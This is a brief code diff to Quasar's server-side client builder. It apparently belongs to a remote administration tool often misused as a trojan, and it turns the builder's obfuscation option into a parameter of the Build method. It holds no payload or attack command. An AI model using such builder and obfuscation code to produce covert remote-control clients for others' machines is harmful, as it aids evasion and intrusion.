@@ -29,7 +29,7 @@ namespace Quasar.Server.Build
         /// <summary>
         /// Builds a client executable.
         /// </summary>
-        public void Build()
+        public void Build(bool obfuscateBuild)
         {
             using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
             {
@@ -43,7 +43,7 @@ namespace Quasar.Server.Build
                 if (!r.Perform())
                     throw new Exception("renaming failed");
 
-                if(_options.Obfuscate)
+                if (obfuscateBuild)
                 {
                     MemoryStream stream = new MemoryStream();
                     asmDef.Write(stream);
